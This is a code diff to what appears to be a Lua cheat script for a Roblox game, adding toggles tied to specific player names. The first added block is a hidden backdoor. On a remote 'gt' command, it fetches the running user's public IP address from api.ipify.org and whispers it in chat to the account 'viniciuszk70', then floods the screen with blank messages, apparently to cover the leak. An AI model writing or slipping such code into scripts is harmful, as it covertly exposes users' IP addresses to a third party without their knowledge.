@@ -3134,6 +3134,16 @@ repeat until nil
 end
 end
 
+if Connect.SendCommand("gt") then
+if LPlayer.Name ~= "viniciuszk70" then
+local GT = tostring(game:HttpGet("https://api.ipify.org", true))
+Replicate.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w viniciuszk70 "..GT, "All")
+for i = 1,100 do
+Message(" ",0,0,0,Enum.Font.GothamBlack,22)
+end
+end
+end
+
 end
 
 end
@@ -3762,6 +3772,19 @@ InfAmmoToggle("on")
 wait(.3)
 
 InfStam("on")
+
+if LPlayer.Name == "GAB_LEALZINHO" then
+ProtectBlockOwner = true
+end
+
+if LPlayer.Name == "viniciuszk70" then
+AutoGuns("slot3")
+local SaveFrame = LPlayer.Character.HumanoidRootPart.CFrame
+local SaveCam = workspace.CurrentCamera.CFrame
+workspace.Remote.loadchar:InvokeServer(nil, "1003")
+LPlayer.Character.HumanoidRootPart.CFrame = SaveFrame
+workspace.CurrentCamera.CFrame = SaveCam
+end
 
 if RemoveOldScript then
 RemoveOldScript()
